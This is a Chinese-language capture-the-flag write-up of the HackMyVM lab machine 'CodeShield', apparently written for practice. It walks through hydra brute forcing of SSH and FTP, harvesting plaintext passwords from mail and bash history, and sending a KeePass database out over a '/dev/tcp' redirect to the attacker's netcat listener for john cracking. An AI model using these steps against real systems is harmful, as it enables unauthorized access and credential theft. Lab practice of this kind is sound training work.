# hmv_CodeShield

# 0.简介

**靶机**：[hackmyvm - CodeShield](https://hackmyvm.eu/machines/machine.php?vm=CodeShield)
**难度**：绿色
**目标 IP**：192.168.205.138
**本机 IP**：192.168.205.141

# 1.扫描

`nmap`起手

```
┌──(kali㉿kali)-[~/test]
└─$ nmap -sS --min-rate 10000 -p- -Pn -sV 192.168.205.138
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-20 10:33 CST
Nmap scan report for 192.168.205.138
Host is up (0.046s latency).
Not shown: 65526 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           vsftpd 3.0.5
80/tcp    open  http          nginx
110/tcp   open  pop3          Dovecot pop3d
143/tcp   open  imap          Dovecot imapd (Ubuntu)
443/tcp   open  ssl/http      nginx
993/tcp   open  imaps?
995/tcp   open  pop3s?
3389/tcp  open  ms-wbt-server Microsoft Terminal Service
22222/tcp open  ssh           OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
MAC Address: 08:00:27:61:49:1F (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OSs: Unix, Linux, Windows; CPE: cpe:/o:linux:linux_kernel, cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.22 seconds
```

先把我们感兴趣的端口挑出来`21、80、443、22222`，现在就这几个，后面没有头绪再挑

# 2.踩点

我比较喜欢先看ftp21端口。先尝试匿名登录（用户名和密码都是**anonymous**）

```bash
┌──(kali㉿kali)-[~/test/tmp]
└─$ ftp 192.168.205.138
Connected to 192.168.205.138.
220 (vsFTPd 3.0.5)
Name (192.168.205.138:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
229 Entering Extended Passive Mode (|||5258|)
150 Here comes the directory listing.
drwxr-xr-x    2 0        137          4096 Aug 30  2023 .
drwxr-xr-x    2 0        137          4096 Aug 30  2023 ..
-rw-rw-r--    1 1002     1002      2349914 Aug 30  2023 CodeShield_pitch_deck.pdf
-rw-rw-r--    1 1003     1003        67520 Aug 28  2023 Information_Security_Policy.pdf
-rw-rw-r--    1 1004     1004       226435 Aug 28  2023 The_2023_weak_password_report.pdf
226 Directory send OK.
ftp> mget *
mget CodeShield_pitch_deck.pdf [anpqy?]? y
229 Entering Extended Passive Mode (|||47152|)
150 Opening BINARY mode data connection for CodeShield_pitch_deck.pdf (2349914 bytes).
100% |******************************************************************************************|  2294 KiB   76.68 MiB/s    00:00 ETA
226 Transfer complete.
2349914 bytes received in 00:00 (75.26 MiB/s)
mget Information_Security_Policy.pdf [anpqy?]? y
229 Entering Extended Passive Mode (|||40453|)
150 Opening BINARY mode data connection for Information_Security_Policy.pdf (67520 bytes).
100% |******************************************************************************************| 67520       38.67 MiB/s    00:00 ETA
226 Transfer complete.
67520 bytes received in 00:00 (30.61 MiB/s)
mget The_2023_weak_password_report.pdf [anpqy?]? y
229 Entering Extended Passive Mode (|||49281|)
150 Opening BINARY mode data connection for The_2023_weak_password_report.pdf (226435 bytes).
100% |******************************************************************************************|   221 KiB   17.71 MiB/s    00:00 ETA
226 Transfer complete.
226435 bytes received in 00:00 (16.96 MiB/s)

```

去文件管理器查看一下这三个pdf文件

1. CodeShield_pitch_deck.pdf

   在末尾发行人名、邮箱、电话等信息，我们收集起来用于后续的爆破

   ```bash
   Jessica Carlson
   j.carlson@codeshield.hmv
   206-555-0146
   CodeShield
   ```
2. Information_Security_Policy.pdf

   一份安全手册，有CEO的名字，但是我们已经收集过了
3. The_2023_weak_password_report.pdf

   有一个密码本，我们也收集一下

   ```bash
   Xxxxxxxxx001
   Password123!
   Greatplace2work!
   Diciembre@2017
   Hairdresser1!
   1qa2ws3ed4rf
   XXXX12345678
   Hairdresser1
   Xxxxxxxxx002
   Xxxxxxxxxx01
   ```

ftp服务的踩点到此告一段落，接着我们去看看80端口。

![Image](https://github.com/user-attachments/assets/24ede8a5-40bb-426a-89f5-a4315fef09fa)

它加载的特别慢，你可以把这两个拦截一下然后刷新，或者你把**burp**打开，开上代理也可以解决这种问题

![Image](https://github.com/user-attachments/assets/9e82acfd-4587-4d74-9955-4dfdf6f5347a)

将上面的人名加入我们的**user**中，需要注意的是它在**正文也隐藏了一个人名**

![Image](https://github.com/user-attachments/assets/2b3da8c1-a942-450f-9098-9d6c70ca519d)

```bash
Angelina Johnson
Jennifer Cruise
John Doe
Bob Watson
Mohammed Mansour
Xian Tan
Thomas Mitchell
Patrick Early
Kevin Valdez
```

浅浅扫一下漏洞和目录

![Image](https://github.com/user-attachments/assets/4857fc94-ca7c-45ad-911f-6e563f437263)

发现了一个`mail`，但是这个我记得没有洞，倒是可以爆破，后面再试。目前来看应该是爆破ssh服务，但是我们目前收集的用户名是无法直接使用的，需要进行转换

```bash
┌──(kali㉿kali)-[~/test/tmp]
└─$ cat user.py  
import sys

def generate_usernames(names):
    usernames = []

    for name in names:
        parts = name.split()
        if len(parts) < 2:
            print(f"Skipping invalid name: {name}")
            continue  # 如果名字不符合格式（没有姓氏），则跳过这一行
      
        usernames.append(parts[0][0].lower() + parts[1].lower())  # 姓名缩写 + 姓氏
        usernames.append(parts[0].lower() + parts[1].lower())  # 全名
        usernames.append(parts[1].lower() + parts[0][0].lower())  # 姓氏 + 姓名首字母
        usernames.append(parts[0].lower())  # 只用名字
        usernames.append(parts[1].lower())  # 只用姓氏

        usernames.append(parts[0][0].lower() + '.' + parts[1].lower())  # "j.carlson"

    return usernames

def read_names_from_file(file_path):
    with open(file_path, 'r') as f:
        names = f.readlines()
    # 去除每行末尾的换行符
    return [name.strip() for name in names]

def main():
    if len(sys.argv) != 2:
        print("Usage: python3 a.py <filename>")
        sys.exit(1)

    # 从命令行参数获取文件路径
    file_path = sys.argv[1]
    try:
        # 读取文件中的名字
        names = read_names_from_file(file_path)
        # 生成用户名列表
        usernames = generate_usernames(names)
        # 打印生成的用户名
        for username in usernames:
            print(username)
    except FileNotFoundError:
        print(f"Error: The file {file_path} was not found.")
        sys.exit(1)

if __name__ == "__main__":
    main()

┌──(kali㉿kali)-[~/test/tmp]
└─$ cat user   
Angelina Johnson
Jennifer Cruise
John Doe
Bob Watson
Mohammed Mansour
Xian Tan
Thomas Mitchell
Patrick Early
Kevin Valdez
j.carlson

┌──(kali㉿kali)-[~/test/tmp]
└─$ python3 user.py user >> user
                                                                                                                                    
┌──(kali㉿kali)-[~/test/tmp]
└─$ cat user
Angelina Johnson
Jennifer Cruise
John Doe
Bob Watson
Mohammed Mansour
Xian Tan
Thomas Mitchell
Patrick Early
Kevin Valdez
j.carlson
Skipping invalid name: j.carlson
ajohnson
angelinajohnson
johnsona
angelina
johnson
a.johnson
jcruise
jennifercruise
cruisej
jennifer
cruise
j.cruise
jdoe
johndoe
doej
john
doe
j.doe
bwatson
bobwatson
watsonb
bob
watson
b.watson
mmansour
mohammedmansour
mansourm
mohammed
mansour
m.mansour
xtan
xiantan
tanx
xian
tan
x.tan
tmitchell
thomasmitchell
mitchellt
thomas
mitchell
t.mitchell
pearly
patrickearly
earlyp
patrick
early
p.early
kvaldez
kevinvaldez
valdezk
kevin
valdez
k.valdez

┌──(kali㉿kali)-[~/test/tmp]
└─$ cat pass                        
Xxxxxxxxx001
Password123!
Greatplace2work!
Diciembre@2017
Hairdresser1!
1qa2ws3ed4rf
XXXX12345678
Hairdresser1
Xxxxxxxxx002
Xxxxxxxxxx01
```

先尝试爆破**ssh服务**

```bash
┌──(kali㉿kali)-[~/test/tmp]
└─$ hydra -L user -P pass ssh://192.168.205.138 -I -u -f -e nsr -t 64 -s 22222 
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-01-20 14:55:19
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 64 tasks per 1 server, overall 64 tasks, 845 login tries (l:65/p:13), ~14 tries per task
[DATA] attacking ssh://192.168.205.138:22222/
[STATUS] 554.00 tries/min, 554 tries in 00:01h, 333 to do in 00:01h, 22 active
1 of 1 target completed, 0 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-01-20 14:56:24
```

无果，再测试爆破**ftp服务**

```bash
┌──(kali㉿kali)-[~/test/tmp]
└─$ hydra -L user -P pass ftp://192.168.205.138 -I -u -f -e nsr -t 64     
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-01-20 14:56:47
[DATA] max 64 tasks per 1 server, overall 64 tasks, 845 login tries (l:65/p:13), ~14 tries per task
[DATA] attacking ftp://192.168.205.138:21/
[21][ftp] host: 192.168.205.138   login: valdezk   password: Greatplace2work!
[STATUS] attack finished for 192.168.205.138 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-01-20 14:57:11
```

爆破出一组用户和密码，我们进去看看有啥

```bash
┌──(kali㉿kali)-[~/test/tmp]
└─$ ftp 192.168.205.138
Connected to 192.168.205.138.
220 (vsFTPd 3.0.5)
Name (192.168.205.138:kali): valdezk
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
229 Entering Extended Passive Mode (|||18011|)
150 Here comes the directory listing.
drwxr-x---   18 1007     1007         4096 Aug 29  2023 .
drwxr-xr-x   14 0        0            4096 Aug 26  2023 ..
-rw-------    1 1007     1007           56 Aug 29  2023 .Xauthority
-rw-rw-r--    1 1007     1007            0 Aug 28  2023 .bash_history
-rw-r--r--    1 1007     1007          220 Aug 26  2023 .bash_logout
-rw-r--r--    1 1007     1007         3771 Aug 26  2023 .bashrc
drwx------   12 1007     1007         4096 Aug 29  2023 .cache
drwx------   11 1007     1007         4096 Aug 28  2023 .config
drwx------    3 1007     1007         4096 Aug 28  2023 .local
drwx------    3 1007     1007         4096 Aug 28  2023 .mozilla
drwxrwxrwt    2 1007     1007         4096 Aug 29  2023 .pcsc10
-rw-r--r--    1 1007     1007          807 Aug 26  2023 .profile
drwx------    6 1007     1007         4096 Aug 28  2023 .thunderbird
-rw-r-----    1 1007     1007            5 Aug 29  2023 .vboxclient-clipboard-tty1-control.pid
-rw-r-----    1 1007     1007            6 Aug 28  2023 .vboxclient-clipboard-tty2-control.pid
-rw-r-----    1 1007     1007            6 Aug 28  2023 .vboxclient-clipboard-tty4-control.pid
-rw-r-----    1 1007     1007            5 Aug 29  2023 .vboxclient-draganddrop-tty1-control.pid
-rw-r-----    1 1007     1007            6 Aug 28  2023 .vboxclient-draganddrop-tty2-control.pid
-rw-r-----    1 1007     1007            6 Aug 28  2023 .vboxclient-draganddrop-tty4-control.pid
-rw-r-----    1 1007     1007            5 Aug 29  2023 .vboxclient-hostversion-tty1-control.pid
-rw-r-----    1 1007     1007            6 Aug 28  2023 .vboxclient-hostversion-tty2-control.pid
-rw-r-----    1 1007     1007            6 Aug 28  2023 .vboxclient-hostversion-tty4-control.pid
-rw-r-----    1 1007     1007            5 Aug 29  2023 .vboxclient-seamless-tty1-control.pid
-rw-r-----    1 1007     1007            6 Aug 28  2023 .vboxclient-seamless-tty2-control.pid
-rw-r-----    1 1007     1007            6 Aug 28  2023 .vboxclient-seamless-tty4-control.pid
-rw-r-----    1 1007     1007            5 Aug 29  2023 .vboxclient-vmsvga-session-tty1-control.pid
-rw-r-----    1 1007     1007            6 Aug 28  2023 .vboxclient-vmsvga-session-tty2-control.pid
-rw-r-----    1 1007     1007            6 Aug 28  2023 .vboxclient-vmsvga-session-tty4-control.pid
-rw-r--r--    1 1007     1007        18728 Aug 29  2023 .xorgxrdp.10.log
-rw-------    1 1007     1007         3985 Aug 29  2023 .xsession-errors
drwxr-xr-x    2 1007     1007         4096 Aug 28  2023 Desktop
drwxr-xr-x    2 1007     1007         4096 Aug 28  2023 Documents
drwxr-xr-x    2 1007     1007         4096 Aug 28  2023 Downloads
drwxr-xr-x    2 1007     1007         4096 Aug 28  2023 Music
drwxr-xr-x    2 1007     1007         4096 Aug 28  2023 Pictures
drwxr-xr-x    2 1007     1007         4096 Aug 28  2023 Public
drwxr-xr-x    2 1007     1007         4096 Aug 28  2023 Templates
drwxr-xr-x    2 1007     1007         4096 Aug 28  2023 Videos
drwx------    3 1007     1007         4096 Aug 28  2023 snap
drwxrwxr-t    2 1007     1007         4096 Aug 29  2023 thinclient_drives
```

进来发现我们位于家目录。又到一年一度的找宝藏环节

```bash
ftp> pwd
Remote directory: /home/valdezk/.thunderbird/fx2h7mhy.default-release/ImapMail/mail.codeshield.hmv
```

在该目录下挖掘到了宝藏😁

![Image](https://github.com/user-attachments/assets/c909abf0-51cf-42b9-9e4b-d7534b6697cc)

```bash
┌──(kali㉿kali)-[~/test/tmp]
└─$ cat Trash
From - Mon Aug 28 18:38:57 2023
X-Mozilla-Status: 0001
X-Mozilla-Status2: 00000000
Return-Path: <t.mitchell@codeshield.hmv>
Delivered-To: k.valdez@codeshield.hmv
Received: from mail.codeshield.hmv (mail.codeshield.hmv [127.0.0.1])
        by mail.codeshield.hmv (Postfix) with ESMTP id 4RXwV61k4Jz62kW
        for <k.valdez@codeshield.hmv>; Sat, 26 Aug 2023 12:04:30 +0000 (UTC)
Authentication-Results: mail.codeshield.hmv (amavisd-new); dkim=pass
        reason="pass (just generated, assumed good)" header.d=codeshield.hmv
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/simple; d=codeshield.hmv;
         h=content-transfer-encoding:content-type:message-id:user-agent
        :subject:to:from:date:mime-version; s=dkim; t=1693051468; x=
        1695643469; bh=9j2IFk0ZpW4pfmvikNYY7hFOEsr+Ze1bR/Ba4zdoUeU=; b=V
        /krnK4TR1tqxJUcKOs1elfa2D4X6hovoYkOpGBtxQgk2+xA4ADTHUnwNcrG4qRh2
        PG7dbgm+zxZjqfa3x2cdc11BQE9zs4n4D3Hi+aBVUkYFQsQXoWdIpQ7jHntkTSrI
        Mq0tEEuTXmKD/s7YDseYOq1y5kcUaANPYMdVmaf+C/9q2HqEFY5Kzmd+7xlInUIs
        nizkQe+0XeZ6l9xmdDPTQVFQS0O98zTYQgMZ/Hd3oQniIF1aB5TocWfNvOcWbDeI
        S5Cm7IFXX2zs4i8h9j2CTohmYjtAoR+InN2jQYuks3VZaqGaDEfXy5ZfdruFbbrh
        Liceo3ueN5jYMdBS8Fl3A==
X-Virus-Scanned: Debian amavisd-new at mail.codeshield.hmv
Received: from mail.codeshield.hmv ([127.0.0.1])
        by mail.codeshield.hmv (mail.codeshield.hmv [127.0.0.1]) (amavisd-new, port 10026)
        with ESMTP id kyzCgpKZGZvf for <k.valdez@codeshield.hmv>;
        Sat, 26 Aug 2023 12:04:28 +0000 (UTC)
Received: from localhost (mail.codeshield.hmv [127.0.0.1])
        by mail.codeshield.hmv (Postfix) with ESMTPSA id 4RXwV43FB8z62kJ
        for <k.valdez@codeshield.hmv>; Sat, 26 Aug 2023 12:04:27 +0000 (UTC)
MIME-Version: 1.0
Date: Sat, 26 Aug 2023 12:04:26 +0000
From: t.mitchell@codeshield.hmv
To: k.valdez@codeshield.hmv
Subject: Need some help for data analytics
User-Agent: Roundcube Webmail
Message-ID: <7d81f2aca5fd7fb5af8609e03cbe1b3a@codeshield.hmv>
X-Sender: t.mitchell@codeshield.hmv
Content-Type: text/plain; charset=US-ASCII;
 format=flowed
Content-Transfer-Encoding: 7bit

Hi Kevin,

Great that you want to help me with the tooling for data analysis. 
Patrick has set some things up, but I can't get it to work properly. As 
just discussed during coffee, I will send you my login details to so 
that you can fix it under my account and that I can continue working.

Password: D@taWh1sperer!

Thanks buddy!

Thomas
                                                

嗨，凯文，

很高兴你想帮助我开发数据分析工具。
帕特里克已经设置了一些东西，但我无法让它正常工作。正如
我们喝咖啡时讨论的那样，我会将我的登录详细信息发送给你，
这样你就可以在
我的账户下修复它，我就可以继续工作了。

密码：D@taWh1sperer！

谢谢伙计！

托马斯
```

这个用户应该不是ftp了吧，收收神通吧，请赐予我一个ssh

```bash
┌──(kali㉿kali)-[~/test/tmp]
└─$ hydra -L user -p D@taWh1sperer! ssh://192.168.205.138 -I -u -f -e nsr -t 64 -s 22222
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-01-20 15:15:11
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 64 tasks per 1 server, overall 64 tasks, 260 login tries (l:65/p:4), ~5 tries per task
[DATA] attacking ssh://192.168.205.138:22222/
[22222][ssh] host: 192.168.205.138   login: mitchellt   password: D@taWh1sperer!
[STATUS] attack finished for 192.168.205.138 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-01-20 15:15:18

┌──(kali㉿kali)-[~/test/tmp]
└─$ ssh mitchellt@192.168.205.138 -p 22222
The authenticity of host '[192.168.205.138]:22222 ([192.168.205.138]:22222)' can't be established.
ED25519 key fingerprint is SHA256:Y+iV2eHvzSBp6ZbF+2VqTJdZ5+XyH5tVaxNCzS7tp3I.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[192.168.205.138]:22222' (ED25519) to the list of known hosts.
             @@@                          
      @@@@@@@@@  @@@@@@                   
 @@@@@@@@@@@@@@          (@@              
 @@@@@@@@@@@@@@           @@    ██████╗ ██████╗ ██████╗ ███████╗███████╗██╗  ██╗██╗███████╗██╗     ██████╗                                 
 @@@@@@@@@@@@@@           @@   ██╔════╝██╔═══██╗██╔══██╗██╔════╝██╔════╝██║  ██║██║██╔════╝██║     ██╔══██╗           
  @@@@@@@@@@@@@          @@    ██║     ██║   ██║██║  ██║█████╗  ███████╗███████║██║█████╗  ██║     ██║  ██║           
  @@@@@@@@@@@@@         @@@    ██║     ██║   ██║██║  ██║██╔══╝  ╚════██║██╔══██║██║██╔══╝  ██║     ██║  ██║           
    @@@@@@@@@@@        @@      ╚██████╗╚██████╔╝██████╔╝███████╗███████║██║  ██║██║███████╗███████╗██████╔╝           
     @@@@@@@@@@      @@@        ╚═════╝ ╚═════╝ ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝╚═╝╚══════╝╚══════╝╚═════╝            
        @@@@@@@   @@@                     
           @@@@@@@                                                         

  _______________________________________________________________________________________________________
 |  _WARNING: This system is restricted to authorized users!___________________________________________  |
 | |                                                                                                   | |
 | | IT IS AN OFFENSE TO CONTINUE WITHOUT PROPER AUTHORIZATION.                                        | |
 | |                                                                                                   | |
 | | This system is restricted to authorized users.                                                    | | 
 | | Individuals who attempt unauthorized access will be prosecuted.                                   | | 
 | | If you're unauthorized, terminate access now!                                                     | | 
 | |                                                                                                   | |
 | |                                                                                                   | |
 | |___________________________________________________________________________________________________| |
 |_______________________________________________________________________________________________________|
mitchellt@192.168.205.138's password: 
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-79-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon Jan 20 07:15:11 AM UTC 2025

  System load:  0.640625           Processes:               240
  Usage of /:   29.1% of 47.93GB   Users logged in:         0
  Memory usage: 59%                IPv4 address for enp0s3: 192.168.205.138
  Swap usage:   0%

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

Expanded Security Maintenance for Applications is not enabled.

10 updates can be applied immediately.
To see these additional updates run: apt list --upgradable

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
New release '24.04.1 LTS' available.
Run 'do-release-upgrade' to upgrade to it.


mitchellt@codeshield:~$ id
uid=1006(mitchellt) gid=1006(mitchellt) groups=1006(mitchellt)

```

# 3.提权

```bash
mitchellt@codeshield:~$ ls -la
total 112
drwxr-x--- 17 mitchellt mitchellt 4096 Aug 30  2023 .
drwxr-xr-x 14 root      root      4096 Aug 26  2023 ..
-rw-------  1 mitchellt mitchellt  209 Aug 30  2023 .bash_history
-rw-r--r--  1 mitchellt mitchellt  220 Aug 26  2023 .bash_logout
-rw-r--r--  1 mitchellt mitchellt 3771 Aug 26  2023 .bashrc
drwx------ 11 mitchellt mitchellt 4096 Jan 20 07:14 .cache
drwx------ 12 mitchellt mitchellt 4096 Aug 29  2023 .config
drwxr-xr-x  2 mitchellt mitchellt 4096 Aug 28  2023 Desktop
drwxr-xr-x  2 mitchellt mitchellt 4096 Aug 28  2023 Documents
drwxr-xr-x  2 mitchellt mitchellt 4096 Aug 28  2023 Downloads
-rw-------  1 mitchellt mitchellt   20 Aug 29  2023 .lesshst
drwx------  3 mitchellt mitchellt 4096 Aug 28  2023 .local
drwxrwxr-x  6 mitchellt mitchellt 4096 Aug 30  2023 mining
drwx------  3 mitchellt mitchellt 4096 Aug 28  2023 .mozilla
drwxr-xr-x  2 mitchellt mitchellt 4096 Aug 28  2023 Music
drwxr-xr-x  2 mitchellt mitchellt 4096 Aug 28  2023 Pictures
-rw-r--r--  1 mitchellt mitchellt  807 Aug 26  2023 .profile
drwxr-xr-x  2 mitchellt mitchellt 4096 Aug 28  2023 Public
drwx------  3 mitchellt mitchellt 4096 Aug 29  2023 snap
drwxr-xr-x  2 mitchellt mitchellt 4096 Aug 28  2023 Templates
drwx------  6 mitchellt mitchellt 4096 Aug 28  2023 .thunderbird
-rwxrwx---  1 mitchellt mitchellt 2401 Aug 28  2023 user.txt
-rw-r-----  1 mitchellt mitchellt    6 Aug 30  2023 .vboxclient-clipboard-tty2-control.pid
-rw-r-----  1 mitchellt mitchellt    6 Aug 30  2023 .vboxclient-draganddrop-tty2-control.pid
-rw-r-----  1 mitchellt mitchellt    6 Aug 30  2023 .vboxclient-hostversion-tty2-control.pid
-rw-r-----  1 mitchellt mitchellt    6 Aug 30  2023 .vboxclient-seamless-tty2-control.pid
-rw-r-----  1 mitchellt mitchellt    6 Aug 30  2023 .vboxclient-vmsvga-session-tty2-control.pid
drwxr-xr-x  2 mitchellt mitchellt 4096 Aug 28  2023 Videos
mitchellt@codeshield:~$ cat .bash_history
echo 'EARL!YP7DeVel@OP'| su - earlyp -c "cp -r /home/earlyp/Development/mining ."
echo 'EARL!YP7DeVel@OP'| su - earlyp -c "cp -r /home/earlyp/Development/mining /tmp"
cp -r /tmp/mining .
ls
cd mining/
ls
exit
mitchellt@codeshield:~$ su - earlyp
Password: 
earlyp@codeshield:~$ sudo -l
[sudo] password for earlyp: 
Sorry, user earlyp may not run sudo on mail.
earlyp@codeshield:~$ ls -la
total 116
drwxr-x--- 19 earlyp earlyp 4096 Aug 29  2023 .
drwxr-xr-x 14 root   root   4096 Aug 26  2023 ..
-rw-------  1 earlyp earlyp   36 Aug 29  2023 .bash_history
-rw-r--r--  1 earlyp earlyp  220 Jan  6  2022 .bash_logout
-rw-r--r--  1 earlyp earlyp 3771 Jan  6  2022 .bashrc
drwx------ 12 earlyp earlyp 4096 Aug 23  2023 .cache
drwx------ 16 earlyp earlyp 4096 Aug 28  2023 .config
drwxr-xr-x  2 earlyp earlyp 4096 Aug 22  2023 Desktop
drwxrwxr-x  3 earlyp earlyp 4096 Aug 28  2023 Development
drwxr-xr-x  2 earlyp earlyp 4096 Aug 28  2023 Documents
drwxr-xr-x  5 earlyp earlyp 4096 Aug 23  2023 Downloads
drwx------  2 earlyp earlyp 4096 Aug 28  2023 .gnupg
drwx------  3 earlyp earlyp 4096 Aug 22  2023 .local
drwxrwxr-x  6 earlyp earlyp 4096 Aug 29  2023 mining
drwxrwxr-x  2 earlyp earlyp 4096 Aug 23  2023 .mono
drwxr-xr-x  2 earlyp earlyp 4096 Aug 22  2023 Music
drwxr-xr-x  3 earlyp earlyp 4096 Aug 23  2023 Pictures
-rw-r--r--  1 earlyp earlyp  807 Jan  6  2022 .profile
drwxr-xr-x  2 earlyp earlyp 4096 Aug 22  2023 Public
-rw-rw-r--  1 earlyp earlyp  233 Aug 23  2023 .recently-used
drwx------  3 earlyp earlyp 4096 Aug 22  2023 snap
drwx------  2 earlyp earlyp 4096 Aug 22  2023 .ssh
-rw-r--r--  1 earlyp earlyp    0 Aug 22  2023 .sudo_as_admin_successful
drwxr-xr-x  2 earlyp earlyp 4096 Aug 22  2023 Templates
-rw-r-----  1 earlyp earlyp    6 Aug 28  2023 .vboxclient-clipboard-tty2-control.pid
-rw-r-----  1 earlyp earlyp    6 Aug 28  2023 .vboxclient-draganddrop-tty2-control.pid
-rw-r-----  1 earlyp earlyp    6 Aug 28  2023 .vboxclient-hostversion-tty2-control.pid
-rw-r-----  1 earlyp earlyp    6 Aug 28  2023 .vboxclient-seamless-tty2-control.pid
-rw-r-----  1 earlyp earlyp    6 Aug 28  2023 .vboxclient-vmsvga-session-tty2-control.pid
drwxr-xr-x  2 earlyp earlyp 4096 Aug 22  2023 Videos
earlyp@codeshield:~$ cat .bash_history
cd ~
ls
cd Development/
ls
pwd
exit
earlyp@codeshield:~$ cd Development
earlyp@codeshield:~/Development$ ls -la
total 12
drwxrwxr-x  3 earlyp earlyp 4096 Aug 28  2023 .
drwxr-x--- 19 earlyp earlyp 4096 Aug 29  2023 ..
drwxrwxr-x  6 earlyp earlyp 4096 Aug 28  2023 mining
earlyp@codeshield:~/Development$ cd mining/
earlyp@codeshield:~/Development/mining$ ls -al
total 92
drwxrwxr-x 6 earlyp earlyp 4096 Aug 28  2023 .
drwxrwxr-x 3 earlyp earlyp 4096 Aug 28  2023 ..
-rw-rw-r-- 1 earlyp earlyp  298 Aug 28  2023 circle.yml
-rw-rw-r-- 1 earlyp earlyp  358 Aug 28  2023 CONTRIBUTING.rst
-rw-rw-r-- 1 earlyp earlyp   46 Aug 28  2023 .coveralls.yml
-rw-rw-r-- 1 earlyp earlyp  634 Aug 28  2023 docker-compose.yml
-rw-rw-r-- 1 earlyp earlyp  938 Aug 28  2023 Dockerfile
drwxrwxr-x 4 earlyp earlyp 4096 Aug 28  2023 docs
drwxrwxr-x 8 earlyp earlyp 4096 Aug 28  2023 .git
-rw-rw-r-- 1 earlyp earlyp  439 Aug 28  2023 .gitignore
-rw-rw-r-- 1 earlyp earlyp  100 Aug 28  2023 .gitmodules
-rw-rw-r-- 1 earlyp earlyp 1081 Aug 28  2023 LICENSE
-rw-rw-r-- 1 earlyp earlyp  794 Aug 28  2023 Makefile
-rw-rw-r-- 1 earlyp earlyp 3181 Aug 28  2023 manage.py
-rw-rw-r-- 1 earlyp earlyp  161 Aug 28  2023 MANIFEST.in
drwxrwxr-x 9 earlyp earlyp 4096 Aug 28  2023 mining
-rw-rw-r-- 1 earlyp earlyp 3501 Aug 28  2023 README.rst
-rw-rw-r-- 1 earlyp earlyp   34 Aug 28  2023 requirements_dev.txt
-rw-rw-r-- 1 earlyp earlyp  261 Aug 28  2023 requirements.txt
drwxrwxr-x 2 earlyp earlyp 4096 Aug 28  2023 scripts
-rw-rw-r-- 1 earlyp earlyp  230 Aug 28  2023 setup.cfg
-rw-rw-r-- 1 earlyp earlyp 2366 Aug 28  2023 setup.py
-rw-rw-r-- 1 earlyp earlyp  312 Aug 28  2023 .travis.yml

earlyp@codeshield:~/Development/mining$ cd ~
earlyp@codeshield:~$ cd Desktop/
earlyp@codeshield:~/Desktop$ ls -al
total 8
drwxr-xr-x  2 earlyp earlyp 4096 Aug 22  2023 .
drwxr-x--- 19 earlyp earlyp 4096 Aug 29  2023 ..
earlyp@codeshield:~/Desktop$ cd ~/Documents/
earlyp@codeshield:~/Documents$ ls -al
total 12
drwxr-xr-x  2 earlyp earlyp 4096 Aug 28  2023 .
drwxr-x--- 19 earlyp earlyp 4096 Aug 29  2023 ..
-rw-------  1 earlyp earlyp 1918 Aug 28  2023 Passwords.kdbx
```

拷过去破解一下

```bash
earlyp@codeshield:~/Documents$ cat Passwords.kdbx > /dev/tcp/192.168.205.141/7777

#kali
┌──(kali㉿kali)-[~/test]
└─$ nc -lvnp 7777 > Passwords.kdbx               
listening on [any] 7777 ...
connect to [192.168.205.141] from (UNKNOWN) [192.168.205.138] 53802
                                                                                                                                     
┌──(kali㉿kali)-[~/test]
└─$ keepass2john Passwords.kdbx > hash
                                                   
┌──(kali㉿kali)-[~/test]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash 
Using default input encoding: UTF-8
Loaded 1 password hash (KeePass [SHA256 AES 32/64])
Cost 1 (iteration count) is 3225806 for all loaded hashes
Cost 2 (version) is 2 for all loaded hashes
Cost 3 (algorithm [0=AES 1=TwoFish 2=ChaCha]) is 0 for all loaded hashes
Will run 12 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:04:14 0.01% (ETA: 2025-02-13 23:25) 0g/s 8.313p/s 8.313c/s 8.313C/s laurita..myfamily
0g 0:00:05:31 0.02% (ETA: 2025-02-14 05:03) 0g/s 8.264p/s 8.264c/s 8.264C/s onlyme..victoria1
0g 0:00:08:56 0.03% (ETA: 2025-02-14 05:14) 0g/s 8.228p/s 8.228c/s 8.228C/s priscila..a1b2c3d4
Session aborted
```

